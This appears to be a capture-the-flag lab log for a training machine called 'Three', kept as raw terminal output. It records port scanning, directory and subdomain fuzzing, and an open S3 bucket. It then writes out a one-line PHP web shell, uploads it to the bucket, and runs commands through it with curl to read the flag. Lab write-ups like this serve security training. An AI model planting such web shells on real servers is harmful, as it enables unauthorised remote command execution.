@@ -1,0 +1,234 @@
+    ~/CTF    main ?1  nmap -sC -sV -p- -T5 10.129.249.58                                                                                            ✔  1m 4s   23:39:51  
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 23:39 CET
+Warning: 10.129.249.58 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.129.249.58
+Host is up (0.049s latency).
+Not shown: 62634 closed tcp ports (conn-refused), 2899 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 178bd425452a20b879f8e258d78e79f4 (RSA)
+|   256 e60f1af6328a40ef2da73b22d1c714fa (ECDSA)
+|_  256 2de1874175f391544116b72b80c68f05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Toppers
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.16 seconds
+ 
+ =============================================================================================
+
+   ~/CTF    main ?1  gobuster dir -u http://10.129.249.58  -w /usr/share/dirb/wordlists/common.txt -x .php                                               INT ✘  23:42:36  
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.249.58
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2022/12/18 23:43:17 Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess.php        (Status: 403) [Size: 278]
+/.htpasswd.php        (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.hta.php             (Status: 403) [Size: 278]
+/images               (Status: 301) [Size: 315] [--> http://10.129.249.58/images/]
+/index.php            (Status: 200) [Size: 11952]
+/index.php            (Status: 200) [Size: 11952]
+/server-status        (Status: 403) [Size: 278]
+Progress: 9228 / 9230 (99.98%)===============================================================
+2022/12/18 23:43:55 Finished
+===============================================================
+
+
+# update DNS see in contact
+
+    ~/CTF    main ?1  cat /etc/hosts                                                                                                                        1 ✘  23:47:36  
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+10.129.249.58  thetoppers.htb
+
+============================================================================================================
+============================================================================================================
+
+Search subdomain:
+
+# Generate list of sub-domain
+
+## Wfuzz
+
+    ~/Téléchargements  wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com"  -u http://thetoppers.htb -t 100    ✔  34s   09:50:29  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://thetoppers.htb/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
+=====================================================================
+
+000000007:   200        234 L    1036 W     11947 Ch    "webdisk"                                                                                                                                           
+000000080:   200        234 L    1036 W     11947 Ch    "svn"                                                                                                                                               
+000000081:   200        234 L    1036 W     11947 Ch    "store"                                                                                                                                             
+000000079:   200        234 L    1036 W     11947 Ch    "wap"                                                                                                                                               
+000000078:   200        234 L    1036 W     11947 Ch    "my"                                                                                                                                                
+000000077:   200        234 L    1036 W     11947 Ch    "email"                                                                                                                                             
+000000076:   200        234 L    1036 W     11947 Ch    "remote"                                                                                                                                            
+000000065:   200        234 L    1036 W     11947 Ch    "mx1"                                                                                                                                               
+000000059:   200        234 L    1036 W     11947 Ch    "www.forum"                                                                                                                                         
+000000068:   200        234 L    1036 W     11947 Ch    "www.m"                                                                                                                                             
+000000062:   200        234 L    1036 W     11947 Ch    "host"                                                                                                                                              
+000000060:   200        234 L    1036 W     11947 Ch    "www.test"                                                                                                                                          
+000000069:   200        234 L    1036 W     11947 Ch    "sip"                                                                                                                                               
+000000067:   200        234 L    1036 W     11947 Ch    "staging"                                                                                                                                           
+000000061:   200        234 L    1036 W     11947 Ch    "stats"                                                                                                                                             
+000000064:   200        234 L    1036 W     11947 Ch    "mail1"                                                                                                                                             
+000000070:   200        234 L    1036 W     11947 Ch    "chat"                                                                                                                                              
+000000071:   200        234 L    1036 W     11947 Ch    "search"                                                                                                                                            
+000000073:   200        234 L    1036 W     11947 Ch    "mx2"                                                                                                                                               
+000000075:   200        234 L    1036 W     11947 Ch    "ipv4"                                                                                                                                              
+...
+
+
+## ffuf
+
+    /opt/HackingTools/Web-fuzzing/ffuf    master ?2  ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H "Host:FUZZ.thetoppers.htb"
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://thetoppers.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.thetoppers.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+cpanel                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 25ms]
+www2                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 28ms]
+secure                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 29ms]
+ns                      [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 31ms]
+imap                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 31ms]
+mx                      [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 28ms]
+localhost               [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 31ms]
+dev                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 27ms]
+vpn                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 29ms]
+ns2                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 31ms]
+dns1                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 24ms]
+static                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 25ms]
+lists                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 24ms]
+img                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 22ms]
+...
+
+
+## gobuster
+
+ gobuster vhost -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain         ✔  10:03:49  
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://thetoppers.htb
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.3
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2022/12/19 10:03:57 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: s3.thetoppers.htb Status: 404 [Size: 21]
+Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
+Progress: 4980 / 4990 (99.80%)===============================================================
+2022/12/19 10:04:10 Finished
+===============================================================
+
+
+
+    ~/Téléchargements  cat /etc/hosts                                                                                                                                                       INT ✘  10:06:28  
+# Static table lookup for hostnames.
+# See hosts(5) for details.
+
+10.129.23.112  thetoppers.htb s3.thetoppers.htb
+
+
+    ~/Téléchargements  ping s3.thetoppers.htb                                                                                                                                                   ✔  10:06:30  
+PING thetoppers.htb (10.129.23.112) 56(84) octets de données.
+64 octets de thetoppers.htb (10.129.23.112) : icmp_seq=1 ttl=63 temps=21.0 ms
+^C
+--- statistiques ping thetoppers.htb ---
+1 paquets transmis, 1 reçus, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 20.982/20.982/20.982/0.000 ms
+
+## Amazon S3 Services
+
+    /opt/HackingTools/Web-fuzzing/amazon  aws configure                                                                                                                                         ✔  10:30:53  
+AWS Access Key ID [****************a]: a
+AWS Secret Access Key [****************a]: a
+Default region name [a]: a
+Default output format [a]: a
+    /opt/HackingTools/Web-fuzzing/amazon  aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb                                                                                     ✔  10:31:07  
+                           PRE images/
+2022-12-19 08:49:19          0 .htaccess
+2022-12-19 08:49:19      11952 index.php
+    /opt/HackingTools/Web-fuzzing/amazon                                                                                                                                                        ✔  10:31:13  
+
+
+# Generate PHP exploit (Remote code execution)
+
+<?php system($_GET['cmd']); ?>
+
+## upload backdoor
+
+    /opt/HackingTools/Web-fuzzing/amazon  aws s3 --endpoint=http://s3.thetoppers.htb cp ~/CTF/Boxes/Three/shell.php s3://thetoppers.htb                                                         ✔  10:31:13  
+upload: ../../../../home/zerocool/CTF/Boxes/Three/shell.php to s3://thetoppers.htb/shell.php
+
+    /opt/HackingTools/Web-fuzzing/amazon  aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb                                                                                     ✔  10:39:34  
+                           PRE images/
+2022-12-19 08:49:19          0 .htaccess
+2022-12-19 08:49:19      11952 index.php
+2022-12-19 10:39:39         30 shell.php
+    /opt/HackingTools/Web-fuzzing/amazon                                                                                                                                                        ✔  10:39:38  
+
+## Execute cmd
+
+    /opt/HackingTools/Web-fuzzing/amazon  curl -X GET http://thetoppers.htb/shell.php\?cmd\="ls"                                                                                            INT ✘  10:43:03  
+images
+index.php
+shell.php
+    /opt/HackingTools/Web-fuzzing/amazon  curl -X GET http://thetoppers.htb/shell.php\?cmd\="whoami"                                                                                            ✔  10:43:17  
+www-data
+
+## get the flag
+
+    /opt/HackingTools/Web-fuzzing/amazon  curl -X GET http://thetoppers.htb/shell.php\?cmd\="ls+../"                                                                                            ✔  10:45:04  
+flag.txt
+html
+    /opt/HackingTools/Web-fuzzing/amazon  curl -X GET http://thetoppers.htb/shell.php\?cmd\="cat+../flag.txt"                                                                                   ✔  10:45:10  
+a980d99281a28d638ac68b9bf9453c2b
